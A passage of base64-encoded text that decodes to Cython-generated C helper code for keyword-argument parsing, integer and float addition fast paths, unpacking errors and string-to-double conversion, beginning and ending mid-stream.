mcgPSBhcmduYW1lcyArIG51bV9wb3NfYXJncztcbiAgICBmb3IgKFB5X3NzaXplX3QgcG9zID0gMDsgcG9zIDwgbnVtX2t3YXJnczsgcG9zKyspIHtcbiNpZiBDWVRIT05fQVZPSURfQk9SUk9XRURfUkVGU1xuICAgICAgICBrZXkgPSBfX1B5eF9QeVNlcXVlbmNlX0lURU0oa3dkcywgcG9zKTtcbiNlbHNlXG4gICAgICAgIGtleSA9IF9fUHl4X1B5VHVwbGVfR0VUX0lURU0oa3dkcywgcG9zKTtcbiNlbmRpZlxuI2lmICFDWVRIT05fQVNTVU1FX1NBRkVfTUFDUk9TXG4gICAgICAgIGlmICh1bmxpa2VseSgha2V5KSkgZ290byBiYWQ7XG4jZW5kaWZcbiAgICAgICAgbmFtZSA9IGZpcnN0X2t3X2FyZztcbiAgICAgICAgd2hpbGUgKCpuYW1lICYmICgqKm5hbWUgIT0ga2V5KSkgbmFtZSsrO1xuICAgICAgICBpZiAoKm5hbWUpIHtcbiAgICAgICAgICAgIFB5T2JqZWN0ICp2YWx1ZSA9IGt3dmFsdWVzW3Bvc107XG4gICAgICAgICAgICB2YWx1ZXNbbmFtZS1hcmduYW1lc10gPSBfX1B5eF9OZXdSZWYodmFsdWUpO1xuICAgICAgICB9IGVsc2Uge1xuICAgICAgICAgICAgc2l6ZV90IGluZGV4X2ZvdW5kID0gMDtcbiAgICAgICAgICAgIGludCBjbXAgPSBfX1B5eF9NYXRjaEtleXdvcmRBcmcoa2V5LCBhcmduYW1lcywgZmlyc3Rfa3dfYXJnLCAmaW5kZXhfZm91bmQsIGZ1bmN0aW9uX25hbWUpO1xuICAgICAgICAgICAgaWYgKGNtcCA9PSAxKSB7XG4gICAgICAgICAgICAgICAgUHlPYmplY3QgKnZhbHVlID0ga3d2YWx1ZXNbcG9zXTtcbiAgICAgICAgICAgICAgICB2YWx1ZXNbaW5kZXhfZm91bmRdID0gX19QeXhfTmV3UmVmKHZhbHVlKTtcbiAgICAgICAgICAgIH0gZWxzZSB7XG4gICAgICAgICAgICAgICAgaWYgKHVubGlrZWx5KGNtcCA9PSAtMSkpIGdvdG8gYmFkO1xuICAgICAgICAgICAgICAgIGlmIChrd2RzMikge1xuICAgICAgICAgICAgICAgICAgICBQeU9iamVjdCAqdmFsdWUgPSBrd3ZhbHVlc1twb3NdO1xuICAgICAgICAgICAgICAgICAgICBpZiAodW5saWtlbHkoUHlEaWN0X1NldEl0ZW0oa3dkczIsIGtleSwgdmFsdWUpKSkgZ290byBiYWQ7XG4gICAgICAgICAgICAgICAgfSBlbHNlIGlmICghaWdub3JlX3Vua25vd25fa3dhcmdzKSB7XG4gICAgICAgICAgICAgICAgICAgIGdvdG8gaW52YWxpZF9rZXl3b3JkO1xuICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgIH1cbiAgICAgICAgfVxuICAgICAgICAjaWYgQ1lUSE9OX0FWT0lEX0JPUlJPV0VEX1JFRlNcbiAgICAgICAgUHlfREVDUkVGKGtleSk7XG4gICAgICAgIGtleSA9IE5VTEw7XG4gICAgICAgICNlbmRpZlxuICAgIH1cbiAgICByZXR1cm4gMDtcbmludmFsaWRfa2V5d29yZDpcbiAgICBQeUVycl9Gb3JtYXQoUHlFeGNfVHlwZUVycm9yLFxuICAgICAgICAiJXMoKSBnb3QgYW4gdW5leHBlY3RlZCBrZXl3b3JkIGFyZ3VtZW50IFwnJVVcJyIsXG4gICAgICAgIGZ1bmN0aW9uX25hbWUsIGtleSk7XG4gICAgZ290byBiYWQ7XG5iYWQ6XG4gICAgI2lmIENZVEhPTl9BVk9JRF9CT1JST1dFRF9SRUZTXG4gICAgUHlfWERFQ1JFRihrZXkpO1xuICAgICNlbmRpZlxuICAgIHJldHVybiAtMTtcbn1cbnN0YXRpYyBpbnQgX19QeXhfUGFyc2VLZXl3b3JkcyhcbiAgICBQeU9iamVjdCAqa3dkcyxcbiAgICBQeU9iamVjdCAqIGNvbnN0ICprd3ZhbHVlcyxcbiAgICBQeU9iamVjdCAqKiBjb25zdCBhcmduYW1lc1tdLFxuICAgIFB5T2JqZWN0ICprd2RzMixcbiAgICBQeU9iamVjdCAqdmFsdWVzW10sXG4gICAgUHlfc3NpemVfdCBudW1fcG9zX2FyZ3MsXG4gICAgUHlfc3NpemVfdCBudW1fa3dhcmdzLFxuICAgIGNvbnN0IGNoYXIqIGZ1bmN0aW9uX25hbWUsXG4gICAgaW50IGlnbm9yZV91bmtub3duX2t3YXJncylcbntcbiAgICBpZiAoQ1lUSE9OX01FVEhfRkFTVENBTEwgJiYgbGlrZWx5KFB5VHVwbGVfQ2hlY2soa3dkcykpKVxuICAgICAgICByZXR1cm4gX19QeXhfUGFyc2VLZXl3b3Jkc1R1cGxlKGt3ZHMsIGt3dmFsdWVzLCBhcmduYW1lcywga3dkczIsIHZhbHVlcywgbnVtX3Bvc19hcmdzLCBudW1fa3dhcmdzLCBmdW5jdGlvbl9uYW1lLCBpZ25vcmVfdW5rbm93bl9rd2FyZ3MpO1xuICAgIGVsc2UgaWYgKGt3ZHMyKVxuICAgICAgICByZXR1cm4gX19QeXhfUGFyc2VLZXl3b3JkRGljdFRvRGljdChrd2RzLCBhcmduYW1lcywga3dkczIsIHZhbHVlcywgbnVtX3Bvc19hcmdzLCBmdW5jdGlvbl9uYW1lKTtcbiAgICBlbHNlXG4gICAgICAgIHJldHVybiBfX1B5eF9QYXJzZUtleXdvcmREaWN0KGt3ZHMsIGFyZ25hbWVzLCB2YWx1ZXMsIG51bV9wb3NfYXJncywgbnVtX2t3YXJncywgZnVuY3Rpb25fbmFtZSwgaWdub3JlX3Vua25vd25fa3dhcmdzKTtcbn1cblxuXG5zdGF0aWMgdm9pZCBfX1B5eF9SYWlzZUFyZ3R1cGxlSW52YWxpZChcbiAgICBjb25zdCBjaGFyKiBmdW5jX25hbWUsXG4gICAgaW50IGV4YWN0LFxuICAgIFB5X3NzaXplX3QgbnVtX21pbixcbiAgICBQeV9zc2l6ZV90IG51bV9tYXgsXG4gICAgUHlfc3NpemVfdCBudW1fZm91bmQpXG57XG4gICAgUHlfc3NpemVfdCBudW1fZXhwZWN0ZWQ7XG4gICAgY29uc3QgY2hhciAqbW9yZV9vcl9sZXNzO1xuICAgIGlmIChudW1fZm91bmQgPCBudW1fbWluKSB7XG4gICAgICAgIG51bV9leHBlY3RlZCA9IG51bV9taW47XG4gICAgICAgIG1vcmVfb3JfbGVzcyA9ICJhdCBsZWFzdCI7XG4gICAgfSBlbHNlIHtcbiAgICAgICAgbnVtX2V4cGVjdGVkID0gbnVtX21heDtcbiAgICAgICAgbW9yZV9vcl9sZXNzID0gImF0IG1vc3QiO1xuICAgIH1cbiAgICBpZiAoZXhhY3QpIHtcbiAgICAgICAgbW9yZV9vcl9sZXNzID0gImV4YWN0bHkiO1xuICAgIH1cbiAgICBQeUVycl9Gb3JtYXQoUHlFeGNfVHlwZUVycm9yLFxuICAgICAgICAgICAgICAgICAiJS4yMDBzKCkgdGFrZXMgJS44cyAlIiBDWVRIT05fRk9STUFUX1NTSVpFX1QgImQgcG9zaXRpb25hbCBhcmd1bWVudCUuMXMgKCUiIENZVEhPTl9GT1JNQVRfU1NJWkVfVCAiZCBnaXZlbikiLFxuICAgICAgICAgICAgICAgICBmdW5jX25hbWUsIG1vcmVfb3JfbGVzcywgbnVtX2V4cGVjdGVkLFxuICAgICAgICAgICAgICAgICAobnVtX2V4cGVjdGVkID09IDEpID8gIiIgOiAicyIsIG51bV9mb3VuZCk7XG59XG5cblxuI2lmICFDWVRIT05fQ09NUElMSU5HX0lOX1BZUFlcbnN0YXRpYyBQeU9iamVjdCogX19QeXhfRmFsbGJhY2tfX19QeXhfUHlMb25nX0FkZE9iakMoUHlPYmplY3QgKm9wMSwgUHlPYmplY3QgKm9wMiwgaW50IGlucGxhY2UpIHtcbiAgICByZXR1cm4gKGlucGxhY2UgPyBQeU51bWJlcl9JblBsYWNlQWRkIDogUHlOdW1iZXJfQWRkKShvcDEsIG9wMik7XG59XG4jaWYgQ1lUSE9OX1VTRV9QWUxPTkdfSU5URVJOQUxTXG5zdGF0aWMgUHlPYmplY3QqIF9fUHl4X1VucGFja2VkX19fUHl4X1B5TG9uZ19BZGRPYmpDKFB5T2JqZWN0ICpvcDEsIFB5T2JqZWN0ICpvcDIsIGxvbmcgaW50dmFsLCBpbnQgaW5wbGFjZSwgaW50IHplcm9kaXZpc2lvbl9jaGVjaykge1xuICAgIENZVEhPTl9NQVlCRV9VTlVTRURfVkFSKGlucGxhY2UpO1xuICAgIENZVEhPTl9VTlVTRURfVkFSKHplcm9kaXZpc2lvbl9jaGVjayk7XG4gICAgY29uc3QgbG9uZyBiID0gaW50dmFsO1xuICAgIGxvbmcgYSwgeDtcbiNpZmRlZiBIQVZFX0xPTkdfTE9OR1xuICAgIGNvbnN0IFBZX0xPTkdfTE9ORyBsbGIgPSBpbnR2YWw7XG4gICAgUFlfTE9OR19MT05HIGxsYSwgbGx4O1xuI2VuZGlmXG4gICAgaWYgKHVubGlrZWx5KF9fUHl4X1B5TG9uZ19Jc1plcm8ob3AxKSkpIHtcbiAgICAgICAgcmV0dXJuIF9fUHl4X05ld1JlZihvcDIpO1xuICAgIH1cbiAgICBpZiAodW5saWtlbHkoIV9fUHl4X1B5TG9uZ19Db21wYWN0QXNMb25nKG9wMSwgJmEpKSkge1xuICAgICAgICBjb25zdCBkaWdpdCogZGlnaXRzID0gX19QeXhfUHlMb25nX0RpZ2l0cyhvcDEpO1xuICAgICAgICBjb25zdCBQeV9zc2l6ZV90IHNpemUgPSBfX1B5eF9QeUxvbmdfU2lnbmVkRGlnaXRDb3VudChvcDEpO1xuICAgICAgICBzd2l0Y2ggKHNpemUpIHtcbiAgICAgICAgICAgIGNhc2UgLTI6XG4gICAgICAgICAgICAgICAgaWYgKDggKiBzaXplb2YobG9uZykgLSAxID4gMiAqIFB5TG9uZ19TSElGVCkge1xuICAgICAgICAgICAgICAgICAgICBhID0gLShsb25nKSAoKCgoKHVuc2lnbmVkIGxvbmcpZGlnaXRzWzFdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKHVuc2lnbmVkIGxvbmcpZGlnaXRzWzBdKSk7XG4gICAgICAgICAgICAgICAgICAgIGJyZWFrO1xuICAgICAgICAgICAgICAgICNpZmRlZiBIQVZFX0xPTkdfTE9OR1xuICAgICAgICAgICAgICAgIH0gZWxzZSBpZiAoOCAqIHNpemVvZihQWV9MT05HX0xPTkcpIC0gMSA+IDIgKiBQeUxvbmdfU0hJRlQpIHtcbiAgICAgICAgICAgICAgICAgICAgbGxhID0gLShQWV9MT05HX0xPTkcpICgoKCgodW5zaWduZWQgUFlfTE9OR19MT05HKWRpZ2l0c1sxXSkgPDwgUHlMb25nX1NISUZUKSB8ICh1bnNpZ25lZCBQWV9MT05HX0xPTkcpZGlnaXRzWzBdKSk7XG4gICAgICAgICAgICAgICAgICAgIGdvdG8gbG9uZ19sb25nO1xuICAgICAgICAgICAgICAgICNlbmRpZlxuICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgICAgICBDWVRIT05fRkFMTFRIUk9VR0g7XG4gICAgICAgICAgICBjYXNlIDI6XG4gICAgICAgICAgICAgICAgaWYgKDggKiBzaXplb2YobG9uZykgLSAxID4gMiAqIFB5TG9uZ19TSElGVCkge1xuICAgICAgICAgICAgICAgICAgICBhID0gKGxvbmcpICgoKCgodW5zaWduZWQgbG9uZylkaWdpdHNbMV0pIDw8IFB5TG9uZ19TSElGVCkgfCAodW5zaWduZWQgbG9uZylkaWdpdHNbMF0pKTtcbiAgICAgICAgICAgICAgICAgICAgYnJlYWs7XG4gICAgICAgICAgICAgICAgI2lmZGVmIEhBVkVfTE9OR19MT05HXG4gICAgICAgICAgICAgICAgfSBlbHNlIGlmICg4ICogc2l6ZW9mKFBZX0xPTkdfTE9ORykgLSAxID4gMiAqIFB5TG9uZ19TSElGVCkge1xuICAgICAgICAgICAgICAgICAgICBsbGEgPSAoUFlfTE9OR19MT05HKSAoKCgoKHVuc2lnbmVkIFBZX0xPTkdfTE9ORylkaWdpdHNbMV0pIDw8IFB5TG9uZ19TSElGVCkgfCAodW5zaWduZWQgUFlfTE9OR19MT05HKWRpZ2l0c1swXSkpO1xuICAgICAgICAgICAgICAgICAgICBnb3RvIGxvbmdfbG9uZztcbiAgICAgICAgICAgICAgICAjZW5kaWZcbiAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICAgICAgQ1lUSE9OX0ZBTExUSFJPVUdIO1xuICAgICAgICAgICAgY2FzZSAtMzpcbiAgICAgICAgICAgICAgICBpZiAoOCAqIHNpemVvZihsb25nKSAtIDEgPiAzICogUHlMb25nX1NISUZUKSB7XG4gICAgICAgICAgICAgICAgICAgIGEgPSAtKGxvbmcpICgoKCgoKCh1bnNpZ25lZCBsb25nKWRpZ2l0c1syXSkgPDwgUHlMb25nX1NISUZUKSB8ICh1bnNpZ25lZCBsb25nKWRpZ2l0c1sxXSkgPDwgUHlMb25nX1NISUZUKSB8ICh1bnNpZ25lZCBsb25nKWRpZ2l0c1swXSkpO1xuICAgICAgICAgICAgICAgICAgICBicmVhaztcbiAgICAgICAgICAgICAgICAjaWZkZWYgSEFWRV9MT05HX0xPTkdcbiAgICAgICAgICAgICAgICB9IGVsc2UgaWYgKDggKiBzaXplb2YoUFlfTE9OR19MT05HKSAtIDEgPiAzICogUHlMb25nX1NISUZUKSB7XG4gICAgICAgICAgICAgICAgICAgIGxsYSA9IC0oUFlfTE9OR19MT05HKSAoKCgoKCgodW5zaWduZWQgUFlfTE9OR19MT05HKWRpZ2l0c1syXSkgPDwgUHlMb25nX1NISUZUKSB8ICh1bnNpZ25lZCBQWV9MT05HX0xPTkcpZGlnaXRzWzFdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKHVuc2lnbmVkIFBZX0xPTkdfTE9ORylkaWdpdHNbMF0pKTtcbiAgICAgICAgICAgICAgICAgICAgZ290byBsb25nX2xvbmc7XG4gICAgICAgICAgICAgICAgI2VuZGlmXG4gICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgICAgIENZVEhPTl9GQUxMVEhST1VHSDtcbiAgICAgICAgICAgIGNhc2UgMzpcbiAgICAgICAgICAgICAgICBpZiAoOCAqIHNpemVvZihsb25nKSAtIDEgPiAzICogUHlMb25nX1NISUZUKSB7XG4gICAgICAgICAgICAgICAgICAgIGEgPSAobG9uZykgKCgoKCgoKHVuc2lnbmVkIGxvbmcpZGlnaXRzWzJdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKHVuc2lnbmVkIGxvbmcpZGlnaXRzWzFdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKHVuc2lnbmVkIGxvbmcpZGlnaXRzWzBdKSk7XG4gICAgICAgICAgICAgICAgICAgIGJyZWFrO1xuICAgICAgICAgICAgICAgICNpZmRlZiBIQVZFX0xPTkdfTE9OR1xuICAgICAgICAgICAgICAgIH0gZWxzZSBpZiAoOCAqIHNpemVvZihQWV9MT05HX0xPTkcpIC0gMSA+IDMgKiBQeUxvbmdfU0hJRlQpIHtcbiAgICAgICAgICAgICAgICAgICAgbGxhID0gKFBZX0xPTkdfTE9ORykgKCgoKCgoKHVuc2lnbmVkIFBZX0xPTkdfTE9ORylkaWdpdHNbMl0pIDw8IFB5TG9uZ19TSElGVCkgfCAodW5zaWduZWQgUFlfTE9OR19MT05HKWRpZ2l0c1sxXSkgPDwgUHlMb25nX1NISUZUKSB8ICh1bnNpZ25lZCBQWV9MT05HX0xPTkcpZGlnaXRzWzBdKSk7XG4gICAgICAgICAgICAgICAgICAgIGdvdG8gbG9uZ19sb25nO1xuICAgICAgICAgICAgICAgICNlbmRpZlxuICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgICAgICBDWVRIT05fRkFMTFRIUk9VR0g7XG4gICAgICAgICAgICBjYXNlIC00OlxuICAgICAgICAgICAgICAgIGlmICg4ICogc2l6ZW9mKGxvbmcpIC0gMSA+IDQgKiBQeUxvbmdfU0hJRlQpIHtcbiAgICAgICAgICAgICAgICAgICAgYSA9IC0obG9uZykgKCgoKCgoKCgodW5zaWduZWQgbG9uZylkaWdpdHNbM10pIDw8IFB5TG9uZ19TSElGVCkgfCAodW5zaWduZWQgbG9uZylkaWdpdHNbMl0pIDw8IFB5TG9uZ19TSElGVCkgfCAodW5zaWduZWQgbG9uZylkaWdpdHNbMV0pIDw8IFB5TG9uZ19TSElGVCkgfCAodW5zaWduZWQgbG9uZylkaWdpdHNbMF0pKTtcbiAgICAgICAgICAgICAgICAgICAgYnJlYWs7XG4gICAgICAgICAgICAgICAgI2lmZGVmIEhBVkVfTE9OR19MT05HXG4gICAgICAgICAgICAgICAgfSBlbHNlIGlmICg4ICogc2l6ZW9mKFBZX0xPTkdfTE9ORykgLSAxID4gNCAqIFB5TG9uZ19TSElGVCkge1xuICAgICAgICAgICAgICAgICAgICBsbGEgPSAtKFBZX0xPTkdfTE9ORykgKCgoKCgoKCgodW5zaWduZWQgUFlfTE9OR19MT05HKWRpZ2l0c1szXSkgPDwgUHlMb25nX1NISUZUKSB8ICh1bnNpZ25lZCBQWV9MT05HX0xPTkcpZGlnaXRzWzJdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKHVuc2lnbmVkIFBZX0xPTkdfTE9ORylkaWdpdHNbMV0pIDw8IFB5TG9uZ19TSElGVCkgfCAodW5zaWduZWQgUFlfTE9OR19MT05HKWRpZ2l0c1swXSkpO1xuICAgICAgICAgICAgICAgICAgICBnb3RvIGxvbmdfbG9uZztcbiAgICAgICAgICAgICAgICAjZW5kaWZcbiAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICAgICAgQ1lUSE9OX0ZBTExUSFJPVUdIO1xuICAgICAgICAgICAgY2FzZSA0OlxuICAgICAgICAgICAgICAgIGlmICg4ICogc2l6ZW9mKGxvbmcpIC0gMSA+IDQgKiBQeUxvbmdfU0hJRlQpIHtcbiAgICAgICAgICAgICAgICAgICAgYSA9IChsb25nKSAoKCgoKCgoKCh1bnNpZ25lZCBsb25nKWRpZ2l0c1szXSkgPDwgUHlMb25nX1NISUZUKSB8ICh1bnNpZ25lZCBsb25nKWRpZ2l0c1syXSkgPDwgUHlMb25nX1NISUZUKSB8ICh1bnNpZ25lZCBsb25nKWRpZ2l0c1sxXSkgPDwgUHlMb25nX1NISUZUKSB8ICh1bnNpZ25lZCBsb25nKWRpZ2l0c1swXSkpO1xuICAgICAgICAgICAgICAgICAgICBicmVhaztcbiAgICAgICAgICAgICAgICAjaWZkZWYgSEFWRV9MT05HX0xPTkdcbiAgICAgICAgICAgICAgICB9IGVsc2UgaWYgKDggKiBzaXplb2YoUFlfTE9OR19MT05HKSAtIDEgPiA0ICogUHlMb25nX1NISUZUKSB7XG4gICAgICAgICAgICAgICAgICAgIGxsYSA9IChQWV9MT05HX0xPTkcpICgoKCgoKCgoKHVuc2lnbmVkIFBZX0xPTkdfTE9ORylkaWdpdHNbM10pIDw8IFB5TG9uZ19TSElGVCkgfCAodW5zaWduZWQgUFlfTE9OR19MT05HKWRpZ2l0c1syXSkgPDwgUHlMb25nX1NISUZUKSB8ICh1bnNpZ25lZCBQWV9MT05HX0xPTkcpZGlnaXRzWzFdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKHVuc2lnbmVkIFBZX0xPTkdfTE9ORylkaWdpdHNbMF0pKTtcbiAgICAgICAgICAgICAgICAgICAgZ290byBsb25nX2xvbmc7XG4gICAgICAgICAgICAgICAgI2VuZGlmXG4gICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgICAgIENZVEhPTl9GQUxMVEhST1VHSDtcbiAgICAgICAgICAgIGRlZmF1bHQ6IHJldHVybiBQeUxvbmdfVHlwZS50cF9hc19udW1iZXItPm5iX2FkZChvcDEsIG9wMik7XG4gICAgICAgIH1cbiAgICB9XG4gICAgICAgICAgICB4ID0gYSArIGI7XG4gICAgICAgIHJldHVybiBQeUxvbmdfRnJvbUxvbmcoeCk7XG4jaWZkZWYgSEFWRV9MT05HX0xPTkdcbiAgICBsb25nX2xvbmc6XG4gICAgICAgICAgICBsbHggPSBsbGEgKyBsbGI7XG4gICAgICAgIHJldHVybiBQeUxvbmdfRnJvbUxvbmdMb25nKGxseCk7XG4jZW5kaWZcbiAgICByZXR1cm4gX19QeXhfRmFsbGJhY2tfX19QeXhfUHlMb25nX0FkZE9iakMob3AxLCBvcDIsIGlucGxhY2UpO1xuICAgIFxuICAgIFxufVxuI2VuZGlmXG5zdGF0aWMgUHlPYmplY3QqIF9fUHl4X0Zsb2F0X19fUHl4X1B5TG9uZ19BZGRPYmpDKFB5T2JqZWN0ICpmbG9hdF92YWwsIGxvbmcgaW50dmFsLCBpbnQgemVyb2RpdmlzaW9uX2NoZWNrKSB7XG4gICAgQ1lUSE9OX1VOVVNFRF9WQVIoemVyb2RpdmlzaW9uX2NoZWNrKTtcbiAgICBjb25zdCBsb25nIGIgPSBpbnR2YWw7XG4gICAgZG91YmxlIGEgPSBfX1B5eF9QeUZsb2F0X0FTX0RPVUJMRShmbG9hdF92YWwpO1xuICAgICAgICBkb3VibGUgcmVzdWx0O1xuICAgICAgICBcbiAgICAgICAgcmVzdWx0ID0gKChkb3VibGUpYSkgKyAoZG91YmxlKWI7XG4gICAgICAgIHJldHVybiBQeUZsb2F0X0Zyb21Eb3VibGUocmVzdWx0KTtcbn1cbnN0YXRpYyBDWVRIT05fSU5MSU5FIFB5T2JqZWN0KiBfX1B5eF9QeUxvbmdfQWRkT2JqQyhQeU9iamVjdCAqb3AxLCBQeU9iamVjdCAqb3AyLCBsb25nIGludHZhbCwgaW50IGlucGxhY2UsIGludCB6ZXJvZGl2aXNpb25fY2hlY2spIHtcbiAgICBDWVRIT05fTUFZQkVfVU5VU0VEX1ZBUihpbnR2YWwpO1xuICAgIENZVEhPTl9VTlVTRURfVkFSKHplcm9kaXZpc2lvbl9jaGVjayk7XG4gICAgI2lmIENZVEhPTl9VU0VfUFlMT05HX0lOVEVSTkFMU1xuICAgIGlmIChsaWtlbHkoUHlMb25nX0NoZWNrRXhhY3Qob3AxKSkpIHtcbiAgICAgICAgcmV0dXJuIF9fUHl4X1VucGFja2VkX19fUHl4X1B5TG9uZ19BZGRPYmpDKG9wMSwgb3AyLCBpbnR2YWwsIGlucGxhY2UsIHplcm9kaXZpc2lvbl9jaGVjayk7XG4gICAgfVxuICAgICNlbmRpZlxuICAgIGlmIChQeUZsb2F0X0NoZWNrRXhhY3Qob3AxKSkge1xuICAgICAgICByZXR1cm4gX19QeXhfRmxvYXRfX19QeXhfUHlMb25nX0FkZE9iakMob3AxLCBpbnR2YWwsIHplcm9kaXZpc2lvbl9jaGVjayk7XG4gICAgfVxuICAgIHJldHVybiBfX1B5eF9GYWxsYmFja19fX1B5eF9QeUxvbmdfQWRkT2JqQyhvcDEsIG9wMiwgaW5wbGFjZSk7XG59XG4jZW5kaWZcblxuXG5zdGF0aWMgQ1lUSE9OX0lOTElORSBQeU9iamVjdCogX19QeXhfUHlPYmplY3RfQ2FsbE9uZUFyZyhQeU9iamVjdCAqZnVuYywgUHlPYmplY3QgKmFyZykge1xuICAgIFB5T2JqZWN0ICphcmdzWzJdID0ge05VTEwsIGFyZ307XG4gICAgcmV0dXJuIF9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsKGZ1bmMsIGFyZ3MrMSwgMSB8IF9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCk7XG59XG5cblxuc3RhdGljIENZVEhPTl9JTkxJTkUgdm9pZCBfX1B5eF9SYWlzZVRvb01hbnlWYWx1ZXNFcnJvcihQeV9zc2l6ZV90IGV4cGVjdGVkKSB7XG4gICAgUHlFcnJfRm9ybWF0KFB5RXhjX1ZhbHVlRXJyb3IsXG4gICAgICAgICAgICAgICAgICJ0b28gbWFueSB2YWx1ZXMgdG8gdW5wYWNrIChleHBlY3RlZCAlIiBDWVRIT05fRk9STUFUX1NTSVpFX1QgImQpIiwgZXhwZWN0ZWQpO1xufVxuXG5cbnN0YXRpYyBDWVRIT05fSU5MSU5FIHZvaWQgX19QeXhfUmFpc2VOZWVkTW9yZVZhbHVlc0Vycm9yKFB5X3NzaXplX3QgaW5kZXgpIHtcbiAgICBQeUVycl9Gb3JtYXQoUHlFeGNfVmFsdWVFcnJvcixcbiAgICAgICAgICAgICAgICAgIm5lZWQgbW9yZSB0aGFuICUiIENZVEhPTl9GT1JNQVRfU1NJWkVfVCAiZCB2YWx1ZSUuMXMgdG8gdW5wYWNrIixcbiAgICAgICAgICAgICAgICAgaW5kZXgsIChpbmRleCA9PSAxKSA/ICIiIDogInMiKTtcbn1cblxuXG5zdGF0aWMgQ1lUSE9OX0lOTElORSBpbnQgX19QeXhfSXRlckZpbmlzaCh2b2lkKSB7XG4gICAgUHlPYmplY3QqIGV4Y190eXBlO1xuICAgIF9fUHl4X1B5VGhyZWFkU3RhdGVfZGVjbGFyZVxuICAgIF9fUHl4X1B5VGhyZWFkU3RhdGVfYXNzaWduXG4gICAgZXhjX3R5cGUgPSBfX1B5eF9QeUVycl9DdXJyZW50RXhjZXB0aW9uVHlwZSgpO1xuICAgIGlmICh1bmxpa2VseShleGNfdHlwZSkpIHtcbiAgICAgICAgaWYgKHVubGlrZWx5KCFfX1B5eF9QeUVycl9HaXZlbkV4Y2VwdGlvbk1hdGNoZXMoZXhjX3R5cGUsIFB5RXhjX1N0b3BJdGVyYXRpb24pKSlcbiAgICAgICAgICAgIHJldHVybiAtMTtcbiAgICAgICAgX19QeXhfUHlFcnJfQ2xlYXIoKTtcbiAgICAgICAgcmV0dXJuIDA7XG4gICAgfVxuICAgIHJldHVybiAwO1xufVxuXG5cbnN0YXRpYyBpbnQgX19QeXhfSXRlcm5leHRVbnBhY2tFbmRDaGVjayhQeU9iamVjdCAqcmV0dmFsLCBQeV9zc2l6ZV90IGV4cGVjdGVkKSB7XG4gICAgaWYgKHVubGlrZWx5KHJldHZhbCkpIHtcbiAgICAgICAgUHlfREVDUkVGKHJldHZhbCk7XG4gICAgICAgIF9fUHl4X1JhaXNlVG9vTWFueVZhbHVlc0Vycm9yKGV4cGVjdGVkKTtcbiAgICAgICAgcmV0dXJuIC0xO1xuICAgIH1cbiAgICByZXR1cm4gX19QeXhfSXRlckZpbmlzaCgpO1xufVxuXG5cbnN0YXRpYyBkb3VibGUgX19QeXhfU2xvd1B5U3RyaW5nX0FzRG91YmxlKFB5T2JqZWN0ICpvYmopIHtcbiAgICBQeU9iamVjdCAqZmxvYXRfdmFsdWUgPSBQeUZsb2F0X0Zyb21TdHJpbmcob2JqKTtcbiAgICBpZiAobGlrZWx5KGZsb2F0X3ZhbHVlKSkge1xuICAgICAgICBkb3VibGUgdmFsdWUgPSBfX1B5eF9QeUZsb2F0X0FTX0RPVUJMRShmbG9hdF92YWx1ZSk7XG4gICAgICAgIFB5X0RFQ1JFRihmbG9hdF92YWx1ZSk7XG4gICAgICAgIHJldHVybiB2YWx1ZTtcbiAgICB9XG4gICAgcmV0dXJuIChkb3VibGUpLTE7XG59XG5zdGF0aWMgY29uc3QgY2hhciogX19QeXhfX1B5Qnl0ZXNfQXNEb3VibGVfQ29weShjb25zdCBjaGFyKiBzdGFydCwgY2hhciogYnVmZmVyLCBQeV9zc2l6ZV90IGxlbmd0aCkge1xuICAgIGludCBsYXN0X3dhc19wdW5jdHVhdGlvbiA9IDE7XG4gICAgaW50IHBhcnNlX2Vycm9yX2ZvdW5kID0gMDtcbiAgICBQeV9zc2l6ZV90IGk7XG4gICAgZm9yIChpPTA7IGkgPCBsZW5ndGg7IGkrKykge1xuICAgICAgICBjaGFyIGNociA9IHN0YXJ0W2ldO1xuICAgICAgICBpbnQgaXNfcHVuY3R1YXRpb24gPSAoY2hyID09IFwnX1wnKSB8IChjaHIgPT0gXCcuXCcpIHwgKGNociA9PSBcJ2VcJykgfCAoY2hyID09IFwnRVwnKTtcbiAgICAgICAgKmJ1ZmZlciA9IGNocjtcbiAgICAgICAgYnVmZmVyICs9IChjaHIgIT0gXCdfXCcpO1xuICAgICAgICBwYXJzZV9lcnJvcl9mb3VuZCB8PSBsYXN0X3dhc19wdW5jdHVhdGlvbiAmIGlzX3B1bmN0dWF0aW9uO1xuICAgICAgICBsYXN0X3dhc19wdW5jdHVhdGlvbiA9IGlzX3B1bmN0dWF0aW9uO1xuICAgIH1cbiAgICBwYXJzZV9lcnJvcl9mb3VuZCB8PSBsYXN0X3dhc19wdW5jdHVhdGlvbjtcbiAgICAqYnVmZmVyID0gXCdcXDBcJztcbiAgICByZXR1cm4gdW5saWtlbHkocGFyc2VfZXJyb3JfZm91bmQpID8gTlVMTCA6IGJ1ZmZlcjtcbn1cbnN0YXRpYyBkb3VibGUgX19QeXhfX1B5Qnl0ZXNfQXNEb3VibGVfaW5mX25hbihjb25zdCBjaGFyKiBzdGFydCwgUHlfc3NpemVfdCBsZW5ndGgpIHtcbiAgICBpbnQgbWF0Y2hlcyA9IDE7XG4gICAgY2hhciBzaWduID0gc3RhcnRbMF07XG4gICAgaW50IGlzX3NpZ25lZCA9IChzaWduID09IFwnK1wnKSB8IChzaWduID09IFwnLVwnKTtcbiAgICBzdGFydCArPSBpc19zaWduZWQ7XG4gICAgbGVuZ3RoIC09IGlzX3NpZ25lZDtcbiAgICBzd2l0Y2ggKHN0YXJ0WzBdKSB7XG4gICAgICAgICNpZmRlZiBQeV9OQU5cbiAgICAgICAgY2FzZSBcJ25cJzpcbiAgICAgICAgY2FzZSBcJ05cJzpcbiAgICAgICAgICAgIGlmICh1bmxpa2VseShsZW5ndGggIT0gMykpIGdvdG8gcGFyc2VfZmFpbHVyZTtcbiAg